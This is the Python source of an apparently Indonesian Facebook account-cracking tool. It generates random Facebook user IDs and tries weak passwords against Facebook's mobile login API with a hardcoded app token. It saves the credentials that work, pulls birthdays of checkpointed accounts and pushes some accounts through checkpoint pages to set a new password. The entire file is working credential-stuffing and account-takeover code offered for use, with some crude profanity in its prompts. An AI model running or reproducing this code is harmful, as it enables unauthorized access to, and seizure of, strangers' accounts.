from setting import *
pass1 = input(war+"Password 01 : "+I)
def Login_user():
        try:
                import requests
                import requests
                from bs4 import BeautifulSoup
                from concurrent.futures import ThreadPoolExecutor
                if os.path.exists("Hasil") == False:
                        os.mkdir("Hasil")
                if os.path.exists("Hasil/cp.txt") == False:
                        open("Hasil/cp.txt","a+").close()
                kentodxx()
        except Exception as E:
      	        exit(war+"ERROR : "+str(E))

def kentodxx():
	os.system("clear")
	ngetik(f"""
{k}Athour   : {c}ITSUKI AND RISKY
{k}Fcaebook : {c}m.facebook.com/llovexnxx
{k}Whatsapp : {c}wa.me/6283143565470
{k}Group FB : {c}Termux Indonesia
{i}________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
{k}             ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
{I}Ok Results Saved In : Hasil/ok.txt
{K}Cp Results Saved In : Hasil/cp.txt{q}
""")
	start()
def start():
	rnn = str(random.randint(657861, 787878))
	gqq = "100000000"+rnn
	rnn = str(random.randint(765728, 987654))
	gqa = "100000000"+rnn
	crackmenu(gqa).passmenu(gqa)
	crackmenu(gqq).passmenu(gqq)
	start()
def select_method(show=True):
        global url
        if show:
                print("\n\n"+war+"Choose Login Method\n")
                print(k+"["+p+"1"+k+"]"+p+" Free Facebook")
                print(k+"["+p+"2"+k+"]"+p+" Mbasic Facebook\n")
        select=input(war+"Method : "+i)
        while select in (""," "):
                print(war+"Don't Empty Cock")
                select=input(inp+"Method : ")
        if select == "1":
                url=url
        elif select == "2":
                url=url.replace("free","mbasic")
        else:
                print(war+"Fill Correctly !!")
                select_method(False)

def eksekusi(username,password):
#        useragent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
        useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
        try:
                respons=login_ris(username,password)
        except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                eksekusi(username,password)
        session=respons[0]
        if "c_user" in session.cookies.get_dict():
                print(i+"Login Sukses "+c+"⟩⟩"+i+" {}|{}".format(username,password))
                open("Hasil/ok.txt","a+").write("{}|{}\n".format(username,password))
        elif "checkpoint" in session.cookies.get_dict():
                session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
                respon=tahap1(session,parser(respons[1].text))
                if respon == "new password":
                        print(i+"Suksess Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,newpass))
                        open("Hasil/newpass.txt","a+").write("{}|{}\n".format(username,newpass))
                elif respon == "no change password":
                        print(i+"Failed Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,password))
                        open("Hasil/no_change.txt","a+").write("{}|{}\n".format(username,password))
                else:
                        print(k+"CheckPoints "+c+"⟩⟩ {}{}|{}".format(p,username,password))
                        if username not in open("Hasil/cp.txt").read():
                                open("Hasil/cp.txt","a+").write("{}|{}\n".format(username,password))
        else:
                print(m+"Login Failed "+c+"⟩⟩"+m+" {}|{}".format(username,password))

def login_ris(username,password,**kwargs):
        session=requests.session()
        parsing=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text)
        kwargs=get_data(parsing,"sign_up")
        kwargs.update({"email":username,"pass":password})
        if '_fb_noscript' in kwargs:
                del kwargs['_fb_noscript']
        session.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":useragent,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url})
        respon=session.post(url+get_action(parsing),data=kwargs)
        return session,respon

def tahap1(session,parsing):
        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
        if "submit[Yes]" in kwargs:
                del kwargs["submit[No]"]
                try:
                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
                except requests.exceptions.TooManyRedirects:
                        respon="kontol"
                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
                        return tahap2(session,parser(respon))
                if "c_user" in session.cookies.get_dict():
                        return "no change password"

def tahap2(session,parsing):
        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
        kwargs.update({"password_new":newpass})
        respons=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs,allow_redirects=False)
        if "c_user" in respons.cookies.get_dict():
                return "new password"

def get_data(parsing,kecuali,**kwargs):
        for lnput in parsing.find_all("input",{"name":True,"value":True}):
                if kecuali in lnput["name"]: continue
                else: kwargs.update({lnput["name"]:lnput["value"]})
        return kwargs

def get_action(parsing):
        return parsing.find("form",{"method":"post"})["action"]

def parser(html):
        return BeautifulSoup(html,"html.parser")

def ngetik(kata,jum=0.002):
        for x in kata + "\n":
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(jum)

class crackmenu:

    def __init__(self,idz):
        self.id = []
    def passmenu(self,idz):
       	self.passwords(idz)
        return


    def api(self, user, zkth):
        for pw in zkth:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            useragenth = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": useragenth,"content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s[%sOK%s]%s %s|%s|%s                 %s'%(H,I,H,I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    loginz = open("login.txt").read()
                    token = open("login.txt").read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday'].replace("/","-")
                    print ('\r%s[%sCP%s]%s %s|%s|%s%s      %s'%(q,K,q,K,user,pw,dob,bh,q))
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ' '
                except:
                    pass
                print ('\r%s[%sCP%s]%s %s|%s                  '%(q,K,q,K,user,pw))
                wrt = ('%s|%s'%(user,pw))
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                break
                continue


    def passwords(self, idz):
        print(idz)
        pws = ["123456", "123456789"]
        self.api(idz, pws)
Login_user()
